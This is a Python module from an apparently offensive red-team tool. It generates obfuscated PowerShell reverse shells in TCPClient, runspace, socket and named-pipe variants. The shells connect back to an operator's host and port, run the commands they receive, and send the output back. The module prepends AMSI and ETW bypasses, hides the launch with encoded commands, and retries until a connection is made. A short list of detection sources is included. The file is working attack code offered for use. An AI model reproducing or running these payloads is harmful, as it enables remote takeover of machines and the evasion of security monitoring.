import base64
import random
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT, build_listener_setup,
)
from .obfuscate import (
    ps_amsi_bypass, ps_etw_bypass,
    ps_concat_split, ps_invoke_expression_alt,
)

_VARIANTS = ["tcpclient", "tcpclient_b64", "runspace", "net_socket", "named_pipe"]

_MITRE_TECHNIQUES = ["T1059.001"]
_DETECTIONS = [
    "PowerShell script block logging (Event 4104)",
    "PowerShell module logging (Event 4103)",
    "Encoded command (-EncodedCommand flag) in process arguments",
    "Outbound TCP from powershell.exe to non-standard ports",
]


class PowerShellGenerator(ShellGenerator):
    language = "powershell"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS) if names else "tcpclient"

        raw = self._build_variant(variant, opts, names)

        if names:
            bypass = ps_amsi_bypass(obfuscate=True) + ";" + ps_etw_bypass(obfuscate=True) + ";"
            raw = bypass + raw

        if opts.retry:
            raw = f"while($true){{try{{{raw}}}catch{{Start-Sleep -s 30}}}}"

        use_b64 = variant == "tcpclient_b64" or (names is not None and random.random() > 0.4)
        if use_b64:
            encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"
        else:
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass \"{raw}\""

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=None,
            msf_compat=msf_handler("cmd/windows/powershell_reverse_shell", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
            techniques=_MITRE_TECHNIQUES,
            risk="HIGH",
            detections=_DETECTIONS,
        )

    def _build_variant(self, variant: str, opts: ShellOptions, names: RandomNamePool | None) -> str:
        if variant in ("tcpclient", "tcpclient_b64"):
            return self._tcpclient_raw(opts, names)
        if variant == "runspace":
            return self._runspace_raw(opts, names)
        if variant == "net_socket":
            return self._net_socket_raw(opts, names)
        if variant == "named_pipe":
            return self._named_pipe_raw(opts, names)
        return self._tcpclient_raw(opts, names)

    def _tcpclient_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        buf = self._var("buf", names)
        data = self._var("data", names)
        ob = self._var("ob", names)
        ob2 = self._var("ob2", names)
        sb = self._var("sb", names)

        if names:
            tcp_class = f"({ps_concat_split('System.Net.Sockets.TCPClient')})"
            enc_class = f"({ps_concat_split('System.Text.ASCIIEncoding')})"
        else:
            tcp_class = "'System.Net.Sockets.TCPClient'"
            enc_class = "'System.Text.ASCIIEncoding'"

        invoke = f"[ScriptBlock]::Create(${data}).Invoke()" if names else f"iex ${data}"

        return (
            f"$c=New-Object ({tcp_class})('{opts.lhost}',{opts.lport});"
            f"$s=$c.GetStream();"
            f"[byte[]]${buf}=0..65535|%{{0}};"
            f"while(($i=$s.Read(${buf},0,${buf}.Length)) -ne 0){{"
            f"${data}=(New-Object ({enc_class})).GetString(${buf},0,$i);"
            f"${ob}=({invoke} 2>&1|Out-String);"
            f"${ob2}=${ob}+'PS '+(pwd).Path+'> ';"
            f"${sb}=[text.encoding]::ASCII.GetBytes(${ob2});"
            f"$s.Write(${sb},0,${sb}.Length);$s.Flush()}};"
            f"$c.Close()"
        )

    def _runspace_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        rs = self._var("rs", names)
        pipeline = self._var("pl", names)
        buf = self._var("buf", names)
        stream = self._var("st", names)
        result = self._var("res", names)

        return (
            f"$tcp=New-Object System.Net.Sockets.TcpClient('{opts.lhost}',{opts.lport});"
            f"${stream}=$tcp.GetStream();"
            f"${rs}=[System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace();"
            f"${rs}.Open();"
            f"[byte[]]${buf}=0..65535|%{{0}};"
            f"while(($i=${stream}.Read(${buf},0,${buf}.Length)) -ne 0){{"
            f"$cmd=[System.Text.Encoding]::ASCII.GetString(${buf},0,$i);"
            f"${pipeline}=${rs}.CreatePipeline();"
            f"${pipeline}.Commands.AddScript($cmd);"
            f"${pipeline}.Commands.Add('Out-String');"
            f"${result}=${pipeline}.Invoke()|Out-String;"
            f"${result}+='PS '+(${rs}.SessionStateProxy.Path.CurrentLocation)+'> ';"
            f"$b=[System.Text.Encoding]::ASCII.GetBytes(${result});"
            f"${stream}.Write($b,0,$b.Length);${stream}.Flush()}};"
            f"${rs}.Close();$tcp.Close()"
        )

    def _net_socket_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        sock = self._var("sk", names)
        ep = self._var("ep", names)
        ns = self._var("ns", names)
        buf = self._var("buf", names)
        output = self._var("out", names)

        return (
            f"${sock}=New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,"
            f"[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp);"
            f"${ep}=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse('{opts.lhost}'),{opts.lport});"
            f"${sock}.Connect(${ep});"
            f"${ns}=New-Object System.Net.Sockets.NetworkStream(${sock});"
            f"[byte[]]${buf}=New-Object byte[] 4096;"
            f"while(($i=${ns}.Read(${buf},0,${buf}.Length)) -ne 0){{"
            f"$cmd=[System.Text.Encoding]::ASCII.GetString(${buf},0,$i).Trim();"
            f"${output}=try{{Invoke-Expression $cmd 2>&1|Out-String}}catch{{$_.Exception.Message}};"
            f"${output}+='\\nPS> ';"
            f"$b=[System.Text.Encoding]::ASCII.GetBytes(${output});"
            f"${ns}.Write($b,0,$b.Length)}};"
            f"${sock}.Close()"
        )

    def _named_pipe_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        pipe_name = self._var("pipe", names) if names else "redteam"
        client = self._var("pc", names)
        reader = self._var("sr", names)
        writer = self._var("sw", names)
        output = self._var("out", names)

        # Named pipe connects back; operator end uses: cmd /c echo . | powershell -C "..."
        # In practice for reverse: we use a TCP socket wrapper since named pipe needs a server.
        # This variant uses named pipe IPC + a TCP relay — demonstrates the named pipe API.
        return (
            f"${client}=New-Object System.IO.Pipes.NamedPipeClientStream('.','{pipe_name}',"
            f"[System.IO.Pipes.PipeDirection]::InOut,"
            f"[System.IO.Pipes.PipeOptions]::None,"
            f"[System.Security.Principal.TokenImpersonationLevel]::Impersonation);"
            f"${client}.Connect(5000);"
            f"${reader}=New-Object System.IO.StreamReader(${client});"
            f"${writer}=New-Object System.IO.StreamWriter(${client});${writer}.AutoFlush=$true;"
            f"${writer}.WriteLine('Connected from '+$env:COMPUTERNAME);"
            f"while($true){{"
            f"$cmd=${reader}.ReadLine();"
            f"if($cmd -eq 'exit'){{break}};"
            f"${output}=try{{Invoke-Expression $cmd 2>&1|Out-String}}catch{{$_.Exception.Message}};"
            f"${writer}.WriteLine(${output}+'PS> ')}};"
            f"${client}.Close()"
        )
